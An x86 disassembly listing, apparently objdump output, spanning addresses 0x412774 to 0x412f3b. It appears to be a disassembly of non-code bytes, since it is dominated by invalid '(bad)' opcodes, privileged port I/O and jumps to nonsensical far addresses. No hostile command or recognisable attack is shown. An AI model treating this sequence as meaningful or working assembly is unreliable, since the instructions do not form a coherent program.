  412774:	sub    cl,dl
  412776:	push   ebp
  412777:	add    al,0xfe
  412779:	imul   BYTE PTR gs:[edi+esi*4+0x67]
  41277e:	(bad)  
  41277f:	frstor [ecx+0xe]
  412782:	loopne 0x412793
  412784:	push   esi
  412785:	mov    ebp,0xea4319a0
  41278a:	push   ebx
  41278b:	ins    BYTE PTR es:[edi],dx
  41278c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41278d:	out    dx,al
  41278e:	out    dx,al
  41278f:	mov    al,0x34
  412791:	mov    BYTE PTR [ecx+ebx*2],al
  412794:	lock aad 0x24
  412797:	lods   eax,DWORD PTR ds:[esi]
  412798:	cwde   
  412799:	in     al,0xe9
  41279b:	mov    eax,0x72237c8f
  4127a0:	pushf  
  4127a1:	mov    dl,0x9a
  4127a3:	dec    eax
  4127a4:	shr    DWORD PTR gs:[ecx],1
  4127a7:	jmp    0xd038ada9
  4127ac:	out    0xb2,al
  4127ae:	rol    BYTE PTR [edi+eiz*8-0x66],1
  4127b2:	icebp  
  4127b3:	imul   ebx,DWORD PTR [esi+0x7c],0x7b
  4127b7:	mov    DWORD PTR [ebx+0x61],0x3827bb2f
  4127be:	jecxz  0x41280b
  4127c0:	aas    
  4127c1:	pushw  0x1b
  4127c4:	int3   
  4127c5:	mov    ebp,0x3cf2aff5
  4127ca:	xchg   ebp,eax
  4127cb:	mov    cl,0x89
  4127cd:	sti    
  4127ce:	lock icebp 
  4127d0:	pop    esp
  4127d1:	mov    dh,0x71
  4127d3:	out    dx,al
  4127d4:	xchg   edx,eax
  4127d5:	or     al,0xa6
  4127d7:	mov    ch,0xab
  4127d9:	bound  ebp,QWORD PTR [esi]
  4127db:	loop   0x41276d
  4127dd:	cld    
  4127de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127df:	mov    ?,WORD PTR es:[edx-0x44db6b7d]
  4127e6:	inc    ecx
  4127e7:	outs   dx,BYTE PTR ds:[esi]
  4127e8:	pop    esi
  4127e9:	out    0x73,al
  4127eb:	shl    BYTE PTR [ebx+ecx*1+0x15],1
  4127ef:	adc    al,0x76
  4127f1:	mov    ?,esi
  4127f3:	add    bh,BYTE PTR [eax]
  4127f5:	xor    BYTE PTR [ebx+0x4d],ah
  4127f8:	jno    0x4127f0
  4127fa:	les    esp,FWORD PTR [esi+0x51bfaae1]
  412800:	cli    
  412801:	(bad)  
  412802:	out    0x73,eax
  412804:	sbb    ch,BYTE PTR [ecx-0x30c6c4cd]
  41280a:	mov    ecx,edx
  41280c:	jg     0x412865
  41280e:	cli    
  41280f:	dec    esp
  412810:	fsub   DWORD PTR [esi-0x1feb3c3]
  412816:	inc    edi
  412817:	cld    
  412818:	gs retf 0x8cc6
  41281c:	sar    bl,1
  41281e:	icebp  
  41281f:	(bad)  
  412820:	sub    DWORD PTR [esi],esi
  412822:	test   al,0x2b
  412824:	stos   DWORD PTR es:[edi],eax
  412825:	cmp    BYTE PTR [esi],dl
  412827:	js     0x41286d
  412829:	jg     0x41283b
  41282b:	jl     0x4127d2
  41282d:	sbb    al,0x7a
  41282f:	int    0x45
  412831:	daa    
  412832:	pop    es
  412833:	cmp    eax,0x4e5f2dc6
  412838:	xor    ah,BYTE PTR [edi+0x77]
  41283b:	das    
  41283c:	jno    0x4127de
  41283e:	rcr    DWORD PTR [edx-0x3a],0xc9
  412842:	or     eax,0x6efa232c
  412847:	jp     0x4128ab
  412849:	test   al,0x4e
  41284b:	sbb    BYTE PTR [ebp-0x21235814],dl
  412851:	lods   eax,DWORD PTR ds:[esi]
  412852:	mov    edx,0xd3503b4b
  412857:	jecxz  0x41283d
  412859:	ins    BYTE PTR es:[edi],dx
  41285a:	add    al,0xee
  41285c:	popa   
  41285d:	push   0x63
  41285f:	addr16 (bad) 
  412861:	xor    al,0xc2
  412863:	sahf   
  412864:	mov    esp,0xad21df77
  412869:	int    0x4c
  41286b:	test   DWORD PTR [esi],0x110ecff6
  412871:	stc    
  412872:	sub    eax,0xb407405f
  412877:	mov    ebx,0xcdcef569
  41287c:	jmp    0x5c8f:0xabc2a7d0
  412883:	shl    ecx,1
  412885:	and    al,0x52
  412887:	arpl   WORD PTR [eax+ebp*1],di
  41288a:	dec    edi
  41288b:	inc    edi
  41288c:	pop    eax
  41288d:	push   ebx
  41288e:	int3   
  41288f:	stc    
  412890:	std    
  412891:	fisub  DWORD PTR [ebx]
  412893:	sbb    esi,DWORD PTR [eax-0x198cb521]
  412899:	or     eax,0xc8ada39a
  41289e:	bsf    edx,DWORD PTR [ecx]
  4128a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128a2:	mov    edx,0xe01c01c5
  4128a7:	mov    bh,0x6b
  4128a9:	(bad)  
  4128aa:	push   ecx
  4128ab:	in     al,0xc6
  4128ad:	mov    ds:0xd494b57f,eax
  4128b2:	add    ebx,edx
  4128b4:	jae    0x4128d1
  4128b6:	adc    BYTE PTR [ebx-0x78],0x31
  4128ba:	dec    ebx
  4128bb:	push   es
  4128bc:	in     eax,0xe1
  4128be:	cmp    esi,edx
  4128c0:	pop    es
  4128c1:	jo     0x41286e
  4128c3:	jge    0x412853
  4128c5:	push   ebp
  4128c6:	mov    edx,0xfcc2552c
  4128cb:	jo     0x4128b3
  4128cd:	es jo  0x412934
  4128d0:	nop
  4128d1:	into   
  4128d2:	stc    
  4128d3:	add    ebx,DWORD PTR [esi-0x4f]
  4128d6:	test   al,0x88
  4128d8:	jns    0x4128f2
  4128da:	ret    
  4128db:	ret    0x39b4
  4128de:	pusha  
  4128df:	jp     0x412869
  4128e1:	and    DWORD PTR [edx],eax
  4128e3:	inc    esp
  4128e4:	xchg   ecx,eax
  4128e5:	push   0xdb22ca7e
  4128ea:	add    BYTE PTR [esi-0x4],cl
  4128ed:	loop   0x41293c
  4128ef:	stc    
  4128f0:	push   esp
  4128f1:	or     dh,bl
  4128f3:	fucomp st(3)
  4128f5:	pushf  
  4128f6:	fstp   QWORD PTR [ebp+esi*1-0x3e83f987]
  4128fd:	mov    bh,0x3c
  4128ff:	or     DWORD PTR [ebx+edx*8-0x63df41b8],esp
  412906:	mov    BYTE PTR [ecx+0x6c07a061],bl
  41290c:	lods   eax,DWORD PTR ds:[esi]
  41290d:	sub    bh,BYTE PTR [ebx+0x24]
  412910:	pusha  
  412911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412912:	loopne 0x412969
  412914:	fwait
  412915:	jge    0x412926
  412917:	clc    
  412918:	les    ecx,FWORD PTR ds:0x352786b5
  41291e:	mov    esi,0x16c33e5
  412923:	adc    esi,DWORD PTR [edx]
  412925:	ins    BYTE PTR es:[edi],dx
  412926:	add    DWORD PTR [eax-0x2f],0x61
  41292a:	sbb    esi,DWORD PTR [edx]
  41292c:	daa    
  41292d:	into   
  41292e:	in     al,dx
  41292f:	gs pop ds
  412931:	sub    DWORD PTR [edi+0x650ed174],edi
  412937:	repnz mov BYTE PTR [edi],bl
  41293a:	dec    esi
  41293b:	mov    ds:0xa1a2d8a5,al
  412940:	push   ss
  412941:	bound  esi,QWORD PTR ss:[edx]
  412944:	dec    eax
  412945:	xchg   edi,eax
  412946:	inc    edx
  412947:	fdivr  DWORD PTR [ebx-0x2e]
  41294a:	cmp    BYTE PTR [ebp-0x2d8a6624],bl
  412950:	out    0x3f,eax
  412952:	push   es
  412953:	mov    dh,BYTE PTR [ebx]
  412955:	dec    edx
  412956:	xchg   ebp,eax
  412957:	ret    0x4c55
  41295a:	dec    eax
  41295b:	jae    0x4129b2
  41295d:	cmp    dl,BYTE PTR [eax+ebp*8+0x45]
  412961:	push   ss
  412962:	mov    edx,0x658904e6
  412967:	dec    edi
  412968:	fbstp  TBYTE PTR [ecx+0x13]
  41296b:	adc    al,0xb6
  41296d:	aam    0x63
  41296f:	pop    esp
  412970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412971:	repnz rcr DWORD PTR [edx+0x777df959],0xde
  412979:	jne    0x4129e6
  41297b:	adc    eax,0x45e668e4
  412980:	test   BYTE PTR [eax-0x11d8be2a],ah
  412986:	inc    edx
  412987:	push   eax
  412988:	jmp    0x199b:0x3132fb1
  41298f:	dec    esi
  412990:	retf   
  412991:	pop    ebp
  412992:	push   ss
  412993:	leave  
  412994:	js     0x41293e
  412996:	sbb    al,0x9
  412998:	bts    DWORD PTR [eax],ebx
  41299b:	cld    
  41299c:	lods   eax,DWORD PTR ds:[esi]
  41299d:	pushf  
  41299e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41299f:	ja     0x412952
  4129a1:	sub    BYTE PTR [eax],dl
  4129a3:	jns    0x4129ae
  4129a5:	xchg   edx,eax
  4129a6:	jp     0x4129f7
  4129a8:	mov    ss,WORD PTR [ebx+0x2a]
  4129ab:	ror    BYTE PTR [esi+0x3fa72214],1
  4129b1:	jno    0x412a00
  4129b3:	mov    al,ds:0x2a9dfd41
  4129b8:	scas   eax,DWORD PTR es:[edi]
  4129b9:	sti    
  4129ba:	mov    esp,0x5ae5a5
  4129bf:	js     0x41297e
  4129c1:	sbb    BYTE PTR [edx+0x36ad3e7d],ah
  4129c7:	call   0x9d01:0xff5bdc9a
  4129ce:	xor    BYTE PTR [edi-0x8],0x42
  4129d2:	cld    
  4129d3:	and    BYTE PTR [eax],dl
  4129d5:	pop    ecx
  4129d6:	xor    ecx,DWORD PTR [eax]
  4129d8:	pushf  
  4129d9:	jno    0x4129bc
  4129db:	imul   esp,eax,0xffffffda
  4129de:	xchg   esp,eax
  4129df:	jb     0x41299f
  4129e1:	mov    bh,0xee
  4129e3:	jnp    0x412a10
  4129e5:	in     eax,dx
  4129e6:	out    dx,eax
  4129e7:	jp     0x4129fc
  4129e9:	data16 test BYTE PTR [ecx-0x39db1ff1],bl
  4129f0:	or     DWORD PTR [esi-0x1454179c],edi
  4129f6:	stos   BYTE PTR es:[edi],al
  4129f7:	inc    ecx
  4129f8:	cmp    esp,ebp
  4129fa:	mov    eax,ds:0x3a025427
  4129ff:	xchg   esi,eax
  412a00:	mov    al,ds:0xc946bce5
  412a05:	hlt    
  412a06:	imul   esi,DWORD PTR [eax-0x3cca93e7],0xf171e368
  412a10:	out    0xa1,al
  412a12:	ins    DWORD PTR es:[edi],dx
  412a13:	xor    ebp,DWORD PTR [edx]
  412a15:	mov    ch,0x7c
  412a17:	xchg   BYTE PTR [ebx-0x1],dh
  412a1a:	in     eax,dx
  412a1b:	jno    0x412a3c
  412a1d:	adc    BYTE PTR [edx+0x3d],0x9f
  412a21:	mov    bl,0x6e
  412a23:	adc    al,0x9c
  412a25:	add    DWORD PTR [edi+0x11eeb272],eax
  412a2b:	push   ecx
  412a2c:	fcom   QWORD PTR [ecx-0x5573278b]
  412a32:	enter  0xc5bc,0x6
  412a36:	iret   
  412a37:	pop    ebx
  412a38:	jo     0x412a2a
  412a3a:	out    dx,eax
  412a3b:	mov    WORD PTR [ebp+0x3604d311],es
  412a41:	data16 adc BYTE PTR [edx+esi*8+0x52cc2a87],dh
  412a49:	pop    eax
  412a4a:	gs lock mov ebx,0xb7695185
  412a51:	inc    esp
  412a52:	push   DWORD PTR [eax+0x68446171]
  412a58:	repz push esp
  412a5a:	jmp    0x412a6d
  412a5c:	pop    es
  412a5d:	imul   DWORD PTR [ebx-0x39]
  412a60:	mov    dl,0xd1
  412a62:	in     eax,dx
  412a63:	lahf   
  412a64:	mov    eax,ds:0xdfbefc67
  412a69:	sbb    ebp,DWORD PTR [ebp-0x2e]
  412a6c:	jmp    0x412a05
  412a6e:	jno    0x412a67
  412a70:	aad    0x75
  412a72:	sub    eax,0x9d2d932a
  412a77:	call   0x2871:0xfae1c7e4
  412a7e:	jge    0x412a2e
  412a80:	aas    
  412a81:	push   esi
  412a82:	test   eax,0xb2c05899
  412a87:	cmp    bl,BYTE PTR [esi]
  412a89:	pop    ebp
  412a8a:	hlt    
  412a8b:	and    ebp,DWORD PTR [eax+0x2fee164b]
  412a91:	inc    esp
  412a92:	test   eax,0x3b941f3b
  412a97:	sub    dh,BYTE PTR [esi-0x18]
  412a9a:	dec    esp
  412a9b:	xor    bh,BYTE PTR [ebx+0x67]
  412a9e:	and    DWORD PTR [ebp+0x22914eaa],esi
  412aa4:	jae    0x412a65
  412aa6:	popa   
  412aa7:	push   cs
  412aa8:	jecxz  0x412ade
  412aaa:	mov    eax,0x915e2915
  412aaf:	push   edx
  412ab0:	jns    0x412a55
  412ab2:	mov    dl,0xa6
  412ab4:	and    eax,0xb5dc6515
  412ab9:	pop    es
  412aba:	mov    esi,0xbc41c396
  412abf:	ret    
  412ac0:	fmul   DWORD PTR [eax-0x75]
  412ac3:	and    eax,0xfc318efa
  412ac8:	(bad)  
  412ac9:	xchg   esp,ebp
  412acb:	mov    bl,0x0
  412acd:	mov    bh,0x17
  412acf:	loopne 0x412a92
  412ad1:	adc    cl,0xc4
  412ad4:	aad    0x60
  412ad6:	div    DWORD PTR [edi]
  412ad8:	daa    
  412ad9:	jg     0x412a98
  412adb:	and    al,BYTE PTR [esi]
  412add:	xor    edx,eax
  412adf:	neg    BYTE PTR [ebx]
  412ae1:	push   eax
  412ae2:	test   edi,0x91104779
  412ae8:	xor    edx,edi
  412aea:	lock ins BYTE PTR es:[edi],dx
  412aec:	fs push ecx
  412aee:	inc    ebx
  412aef:	popf   
  412af0:	push   ss
  412af1:	inc    esp
  412af2:	add    ecx,DWORD PTR [esi+edi*8-0x36]
  412af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412af7:	and    BYTE PTR ds:0xcde17deb,al
  412afd:	cmp    bh,BYTE PTR [ebp-0x7d8b0020]
  412b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b04:	adc    ah,BYTE PTR [ecx-0x75fa111c]
  412b0a:	cld    
  412b0b:	pop    ss
  412b0c:	xchg   ecx,eax
  412b0d:	or     al,0x18
  412b0f:	repz pop edx
  412b11:	pop    ebp
  412b12:	dec    ebp
  412b13:	gs push ebx
  412b15:	mov    ah,0x25
  412b17:	in     eax,0x10
  412b19:	fisttp DWORD PTR [edi+ecx*1]
  412b1c:	push   edi
  412b1d:	sbb    edi,ebx
  412b1f:	(bad)  
  412b20:	pop    ebx
  412b21:	pop    edx
  412b22:	xor    BYTE PTR [edx+0x6e],bh
  412b25:	out    dx,eax
  412b26:	add    eax,0xba3f1914
  412b2b:	pop    ss
  412b2c:	popf   
  412b2d:	xchg   ebp,eax
  412b2e:	jb     0x412b2c
  412b30:	xor    BYTE PTR [ebx],0x7f
  412b33:	xchg   ecx,eax
  412b34:	inc    edx
  412b35:	xchg   edx,eax
  412b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b37:	push   eax
  412b38:	jp     0x412af2
  412b3a:	arpl   WORD PTR [esi+0x6f],dx
  412b3d:	aaa    
  412b3e:	jb     0x412ad1
  412b40:	sbb    edx,0xffffffe1
  412b43:	fsubr  QWORD PTR [edi+ecx*2-0xc]
  412b47:	lods   al,BYTE PTR ds:[esi]
  412b48:	loope  0x412b71
  412b4a:	cmp    eax,0x130d7b6e
  412b4f:	xor    eax,ebx
  412b51:	and    ah,BYTE PTR [ebx+ebx*1-0x4810cee3]
  412b58:	push   ss
  412b59:	or     dl,BYTE PTR [eax]
  412b5b:	popa   
  412b5c:	cld    
  412b5d:	cld    
  412b5e:	in     eax,dx
  412b5f:	push   es
  412b60:	or     bh,dl
  412b62:	xchg   BYTE PTR [edx+0x1aec685a],dh
  412b68:	mov    ds:0x63ea290b,al
  412b6d:	enter  0xac37,0xbf
  412b71:	jo     0x412b27
  412b73:	call   0x3797:0xc9eb2b25
  412b7a:	inc    ebx
  412b7b:	bound  edi,QWORD PTR [edi+0x58]
  412b7e:	loope  0x412b94
  412b80:	and    eax,0xdb922808
  412b85:	or     al,0xa2
  412b87:	int    0xe9
  412b89:	cmp    eax,0x46d2f3b2
  412b8e:	jnp    0x412b97
  412b90:	cwde   
  412b91:	adc    BYTE PTR [eax+0x744eed93],dh
  412b97:	scas   al,BYTE PTR es:[edi]
  412b98:	ds push esp
  412b9a:	popf   
  412b9b:	cs dec esp
  412b9d:	push   esi
  412b9e:	rcr    edx,1
  412ba0:	lea    eax,[ebp-0x3deca65]
  412ba6:	idiv   DWORD PTR [ecx]
  412ba8:	sbb    eax,0x69deb33c
  412bad:	push   es
  412bae:	repz add eax,DWORD PTR ds:[ecx+0x4415d68b]
  412bb6:	int    0x5
  412bb8:	lock clc 
  412bba:	or     al,0x87
  412bbc:	sub    eax,0x168b3a26
  412bc1:	clc    
  412bc2:	or     eax,0x93151325
  412bc7:	in     eax,dx
  412bc8:	or     eax,DWORD PTR [ebx-0xa]
  412bcb:	test   DWORD PTR [eax+eiz*4],ebx
  412bce:	imul   BYTE PTR [bp+si+0x233a]
  412bd3:	mov    ds:0xbe93ca5f,eax
  412bd8:	pop    ebx
  412bd9:	sbb    eax,0x37e313fb
  412bde:	push   eax
  412bdf:	cdq    
  412be0:	out    dx,eax
  412be1:	(bad)  
  412be2:	(bad)  
  412be4:	fcom   QWORD PTR [edx]
  412be6:	sbb    BYTE PTR ds:0xefe0da97,dh
  412bec:	mov    ds:0x9a4904de,eax
  412bf1:	dec    eax
  412bf2:	push   ds
  412bf3:	or     edi,ebx
  412bf5:	imul   ebp,DWORD PTR [edx+ebx*4],0x6f
  412bf9:	stc    
  412bfa:	push   es
  412bfb:	xchg   esi,eax
  412bfc:	test   BYTE PTR [ebp-0x869aa7a],bl
  412c02:	add    eax,edi
  412c04:	mul    DWORD PTR ds:0xb81ece1a
  412c0a:	push   ebp
  412c0b:	push   ss
  412c0c:	fnstsw WORD PTR [ebx-0x2c49f08a]
  412c12:	mov    ch,0x89
  412c14:	mov    bh,0x50
  412c16:	pop    ss
  412c17:	jmp    0x5dff7de5
  412c1c:	ja     0x412c32
  412c1e:	and    al,0xd9
  412c20:	sub    ebp,DWORD PTR [ebx]
  412c22:	ret    
  412c23:	cmc    
  412c24:	jmp    0xd3ec:0x2a820fc7
  412c2b:	stos   DWORD PTR es:[edi],eax
  412c2c:	fld    TBYTE PTR [ecx+eax*1-0x7750c635]
  412c33:	mov    ah,0x9a
  412c35:	sub    eax,edi
  412c37:	push   esp
  412c38:	or     dh,al
  412c3a:	fwait
  412c3b:	in     al,0x1
  412c3d:	imul   ecx,DWORD PTR [edx+0x3194ab22],0xffffffcd
  412c44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c45:	iret   
  412c46:	and    bh,BYTE PTR [edx-0x7681956d]
  412c4c:	mov    ch,BYTE PTR [ebp-0x2d5ceb2a]
  412c52:	and    eax,0xf125e1cc
  412c57:	push   esp
  412c58:	aad    0x30
  412c5a:	xor    edx,ebp
  412c5c:	mov    ecx,0xc1c7efe6
  412c61:	cmp    eax,0xbdc7f521
  412c66:	mov    bh,0xcc
  412c68:	arpl   WORD PTR ds:0xb4698e04,ax
  412c6e:	add    edi,DWORD PTR [esi-0x75]
  412c71:	jp     0x412c48
  412c73:	sub    BYTE PTR [edi],al
  412c75:	bound  edx,QWORD PTR [edi-0x662c0bb5]
  412c7b:	sub    DWORD PTR [edi-0x34aef5cf],ebp
  412c81:	cmp    ecx,DWORD PTR [edx+0x48b056e3]
  412c87:	inc    esi
  412c88:	dec    ecx
  412c89:	jp     0x412c93
  412c8b:	fcmove st,st(4)
  412c8d:	test   eax,0xc462a367
  412c92:	in     eax,0x77
  412c94:	mov    ds:0x9a05f57a,eax
  412c99:	fwait
  412c9a:	call   0x7b208aee
  412c9f:	aad    0xca
  412ca1:	inc    esp
  412ca2:	cmp    cl,dl
  412ca4:	or     al,0x46
  412ca6:	(bad)  
  412ca7:	jns    0x412c3f
  412ca9:	adc    DWORD PTR [edi+0x4],esi
  412cac:	mov    al,0xb3
  412cae:	sbb    DWORD PTR [ebp*2+0x3d8c84c7],ebp
  412cb5:	aas    
  412cb6:	in     al,0x48
  412cb8:	add    ebx,DWORD PTR [edi+0x78]
  412cbb:	push   esi
  412cbc:	scas   eax,DWORD PTR es:[edi]
  412cbd:	movs   BYTE PTR es:[di],BYTE PTR es:[si]
  412cc0:	stc    
  412cc1:	cmp    DWORD PTR [eax-0x5d],esp
  412cc4:	(bad)  
  412cc5:	dec    ebp
  412cc6:	dec    ebp
  412cc7:	sti    
  412cc8:	fnstsw WORD PTR [edx]
  412cca:	push   0xffffff96
  412ccc:	jle    0x412c58
  412cce:	inc    ebp
  412ccf:	jno    0x412ca2
  412cd1:	sub    DWORD PTR [esi-0x66],0xa493e445
  412cd8:	leave  
  412cd9:	retf   0x7b54
  412cdc:	mov    eax,0xa556d83c
  412ce1:	push   es
  412ce2:	ret    0x176e
  412ce5:	loopne 0x412cac
  412ce7:	sub    edi,DWORD PTR [edi-0x47]
  412cea:	xchg   BYTE PTR [ebx],bl
  412cec:	jnp    0x412cd9
  412cee:	inc    esi
  412cef:	xor    DWORD PTR [esi],edx
  412cf1:	mov    ds:0x290623b0,eax
  412cf6:	mov    ch,0x75
  412cf8:	out    0xaa,al
  412cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cfb:	sub    eax,0x230eb552
  412d00:	or     eax,0x8684cb95
  412d05:	retf   0xb42c
  412d08:	push   ebx
  412d09:	push   esp
  412d0a:	bound  eax,QWORD PTR [edx-0x78014b5]
  412d10:	push   ecx
  412d11:	es jo  0x412d8b
  412d14:	jl     0x412c98
  412d16:	mov    ch,0xbc
  412d18:	jmp    0x1b95:0x67878e23
  412d1f:	add    DWORD PTR [edi],ebx
  412d21:	test   DWORD PTR [esi],esi
  412d23:	loope  0x412cb0
  412d25:	xchg   esi,eax
  412d26:	mov    esp,0x6a91668
  412d2b:	adc    bh,ch
  412d2d:	sbb    al,0xff
  412d2f:	push   cs
  412d30:	adc    ecx,DWORD PTR [ebp+ecx*1-0xa182460]
  412d37:	jae    0x412d6d
  412d39:	adc    bl,BYTE PTR [ecx+0x6e790087]
  412d3f:	popf   
  412d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d41:	into   
  412d42:	or     dl,ch
  412d44:	mov    al,ds:0x3833c6c7
  412d49:	nop
  412d4a:	or     bl,dl
  412d4c:	mov    al,BYTE PTR [ebp+0x32]
  412d4f:	scas   al,BYTE PTR es:[edi]
  412d50:	or     DWORD PTR [edi+0x6e0f3454],edi
  412d56:	xor    ah,BYTE PTR [edx]
  412d58:	out    dx,al
  412d59:	and    eax,0x5f001e15
  412d5e:	xor    al,0xba
  412d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d61:	(bad)
  412d65:	inc    ebp
  412d66:	or     eax,0x93192cff
  412d6b:	pop    ebp
  412d6c:	loopne 0x412db3
  412d6e:	jo     0x412dba
  412d70:	popf   
  412d71:	hlt    
  412d72:	les    edi,FWORD PTR [eax]
  412d74:	aam    0x55
  412d76:	jge    0x412d4d
  412d78:	out    dx,eax
  412d79:	lahf   
  412d7a:	dec    eax
  412d7b:	popa   
  412d7c:	es popa 
  412d7e:	int3   
  412d7f:	out    0xd4,al
  412d81:	xor    eax,0x497bad16
  412d86:	out    0x8f,eax
  412d88:	inc    esi
  412d89:	jbe    0x412db8
  412d8b:	pop    ss
  412d8c:	xchg   ecx,eax
  412d8d:	inc    esi
  412d8e:	and    dl,BYTE PTR [ecx-0x20]
  412d91:	clc    
  412d92:	fwait
  412d93:	mov    esp,ebp
  412d95:	cmp    al,0xad
  412d97:	xchg   ebx,eax
  412d98:	jle    0x412d1e
  412d9a:	pop    edx
  412d9b:	test   BYTE PTR [ebp-0x2b],0xa9
  412d9f:	sbb    eax,0x367c0e08
  412da4:	cmp    dl,BYTE PTR [edx]
  412da6:	outs   dx,BYTE PTR ds:[esi]
  412da7:	xchg   ebp,eax
  412da8:	mov    esi,0x38bbd20a
  412dad:	or     ebp,esp
  412daf:	xchg   ecx,eax
  412db0:	xlat   BYTE PTR ds:[ebx]
  412db1:	pop    edx
  412db2:	in     al,dx
  412db3:	or     DWORD PTR [ebp-0xdf3ba47],ebp
  412db9:	push   ds
  412dba:	jnp    0x412e33
  412dbc:	dec    ebx
  412dbd:	popf   
  412dbe:	sar    ecx,cl
  412dc0:	pop    ds
  412dc1:	xchg   edi,eax
  412dc2:	inc    eax
  412dc3:	xchg   esp,eax
  412dc4:	repnz call 0x2cf0:0x6bddd254
  412dcc:	pop    es
  412dcd:	(bad)  
  412dce:	fcomp  DWORD PTR [ecx-0x5d]
  412dd1:	fs (bad) 
  412dd5:	call   0xc3c76dd7
  412dda:	cmp    dh,BYTE PTR [ecx+0x51]
  412ddd:	mov    edx,0x7b776761
  412de2:	lea    esi,[edx+ebx*4]
  412de5:	call   FWORD PTR [edx-0xf]
  412de8:	add    esp,edi
  412dea:	jns    0x412d99
  412dec:	jb     0x412da3
  412dee:	pop    ecx
  412def:	test   eax,0x8504dcb2
  412df4:	inc    esp
  412df5:	out    dx,eax
  412df6:	(bad)  
  412df7:	mov    cl,0xf6
  412df9:	lahf   
  412dfa:	fld    DWORD PTR [edi]
  412dfc:	mov    bh,0xd1
  412dfe:	jnp    0x412e3a
  412e00:	xchg   edi,eax
  412e01:	ins    DWORD PTR es:[edi],dx
  412e02:	loope  0x412dd4
  412e04:	popf   
  412e05:	repz jl 0x412dc1
  412e08:	xchg   esp,eax
  412e09:	adc    BYTE PTR [esi],bl
  412e0b:	loope  0x412e82
  412e0d:	and    edx,DWORD PTR ss:[edi-0x45]
  412e11:	fs inc ebx
  412e13:	pop    gs
  412e15:	mov    DWORD PTR [ebp+0x7534e556],eax
  412e1b:	in     al,dx
  412e1c:	out    dx,al
  412e1d:	mov    dh,0xeb
  412e1f:	inc    edx
  412e20:	stos   DWORD PTR es:[edi],eax
  412e21:	repz push 0x39
  412e24:	test   eax,0x24e8cbb9
  412e2a:	fadd   DWORD PTR [ebx+0x28]
  412e2d:	or     ebx,0xfbd257b4
  412e33:	enter  0xe449,0xa4
  412e37:	div    BYTE PTR [esi]
  412e39:	and    edi,DWORD PTR [ecx+0xe]
  412e3c:	adc    al,0x93
  412e3e:	mov    eax,ds:0x7f7f80e6
  412e43:	push   ds
  412e44:	(bad)  
  412e46:	mov    al,dh
  412e48:	fcmove st,st(4)
  412e4a:	(bad)  
  412e4c:	call   0x9aab3b5a
  412e51:	mov    edx,0xf4f7d9cc
  412e56:	adc    eax,0x33c46977
  412e5b:	mov    bl,0x4f
  412e5d:	mov    dl,0xb4
  412e5f:	mov    esi,0x554138e4
  412e64:	mov    bh,0x96
  412e66:	in     al,dx
  412e67:	not    ch
  412e69:	and    eax,DWORD PTR [edi-0x38a727fd]
  412e6f:	push   edi
  412e70:	sub    ebx,0x9954ab01
  412e76:	(bad)  
  412e77:	punpckhwd mm2,mm7
  412e7a:	(bad)  
  412e7b:	std    
  412e7c:	push   es
  412e7d:	(bad)  
  412e7f:	enter  0x1861,0x3
  412e83:	inc    eax
  412e84:	dec    ebx
  412e85:	(bad)  
  412e86:	lahf   
  412e87:	push   edx
  412e88:	(bad)  
  412e89:	fstp   TBYTE PTR [edx+0x5064129d]
  412e8f:	cmp    esi,DWORD PTR [esi+0x9da678e]
  412e95:	sahf   
  412e96:	dec    edx
  412e97:	mov    ecx,0xf996b883
  412e9c:	iret   
  412e9d:	or     eax,DWORD PTR [ecx+eiz*8+0x58]
  412ea1:	imul   esi,DWORD PTR [esi+0x159ee376],0x6d933140
  412eab:	les    ebp,FWORD PTR [esi+0x8]
  412eae:	dec    ebp
  412eaf:	stos   BYTE PTR es:[edi],al
  412eb0:	aad    0x76
  412eb2:	iret   
  412eb3:	mov    edi,0x82d56f
  412eb8:	xlat   BYTE PTR ds:[ebx]
  412eb9:	fnsave [edi+0x6e599e6]
  412ebf:	pop    ds
  412ec0:	out    0x4f,eax
  412ec2:	add    BYTE PTR [ebx],bh
  412ec4:	mov    eax,ds:0x11247412
  412ec9:	scas   al,BYTE PTR es:[edi]
  412eca:	mov    eax,0x4ba59d65
  412ecf:	add    cl,BYTE PTR [ecx-0x4d]
  412ed2:	fwait
  412ed3:	loope  0x412ed7
  412ed5:	shl    BYTE PTR [ebx+0x23],1
  412ed8:	dec    eax
  412ed9:	ds mov ch,0xc2
  412edc:	loopne 0x412e8d
  412ede:	xor    al,0x31
  412ee0:	pop    edi
  412ee1:	retf   0xf645
  412ee4:	inc    esi
  412ee5:	mov    ebp,0x62cd0977
  412eea:	jp     0x412ee2
  412eec:	push   esp
  412eed:	cmp    esi,DWORD PTR [ecx]
  412eef:	popa   
  412ef0:	xchg   edx,eax
  412ef1:	ins    BYTE PTR es:[edi],dx
  412ef2:	out    dx,al
  412ef3:	jl     0x412f49
  412ef5:	ror    bh,1
  412ef7:	xor    bl,0x1d
  412efa:	ins    BYTE PTR es:[edi],dx
  412efb:	jno    0x412f45
  412efd:	ins    BYTE PTR es:[edi],dx
  412efe:	out    dx,eax
  412eff:	ja     0x412eb9
  412f01:	mov    WORD PTR [edx-0x58cf00aa],fs
  412f07:	mov    ecx,0x207542c9
  412f0c:	jne    0x412f40
  412f0e:	ins    DWORD PTR es:[edi],dx
  412f0f:	pop    esi
  412f10:	daa    
  412f11:	mov    esp,0x1b7a5ea
  412f16:	mov    al,ds:0x270d5252
  412f1b:	mov    ds:0xf81d339f,al
  412f20:	(bad)  
  412f21:	xor    esp,esp
  412f23:	(bad)  
  412f24:	out    dx,al
  412f25:	mov    ah,0xe0
  412f27:	aad    0x35
  412f29:	js     0x412f78
  412f2b:	ret    0xb73b
  412f2e:	cmp    BYTE PTR [edx+0x5eddea62],dh
  412f34:	shl    DWORD PTR [ecx-0x2c],0x0
  412f38:	and    BYTE PTR [edi-0x6d],al
  412f3b:	outs   dx,DWORD PTR ds:[esi]
